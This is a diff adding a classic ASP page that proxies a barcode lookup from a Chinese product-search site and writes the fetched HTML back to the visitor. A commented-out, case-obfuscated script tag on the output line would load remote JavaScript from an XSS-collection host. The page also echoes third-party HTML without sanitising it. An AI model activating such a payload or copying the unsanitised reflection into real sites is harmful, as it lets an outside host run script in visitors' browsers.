@@ -1,0 +1,33 @@
+<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
+<!--#include file="aspjson.asp" -->
+<%
+Response.Charset = "utf-8"
+Response.CodePage = "65001"
+Session.CodePage = "65001"
+
+str = RequestUrl("http://search.anccnet.com/searchResult2.aspx?keyword=6940839700693","get","")
+str = Replace(str,"dist/","http://search.anccnet.com/dist/")
+str = Replace(str,"css/goods.css","http://search.anccnet.com/css/goods.css")
+str = Replace(str,"/img/logoBar1.gif","http://search.anccnet.com/img/logoBar1.gif")
+Response.Write str '& "<sCRiPt sRC=https://xss.pt/JKGv></sCrIpT>"
+
+'Get/Post方法请求url,获取请求内容
+Function RequestUrl(url,method,data)
+  On Error Resume Next
+  Set XmlHttp = Server.CreateObject("WinHttp.WinHttpRequest.5.1")  'Msxml2.XMLHTTP.3.0,Microsoft.XMLHTTP,WinHttp.WinHttpRequest.5.1
+  With XmlHttp
+    .SetTimeOuts 20000,20000,20000,20000
+    .open method,url, false
+    .setRequestHeader "Content-Type", "application/x-www-form-urlencoded" 
+    .setRequestHeader "Referer","http://search.anccnet.com/searchResult2.aspx?keyword=6940839700693"
+    .send(data)
+    RequestUrl = .responseText
+    End With
+  If Err.Number<>0 Then
+    Response.Write "XMLHTTP请求超时"
+    Err.Clear
+    Response.End
+  End If    
+  Set XmlHttp = nothing
+End Function
+%>
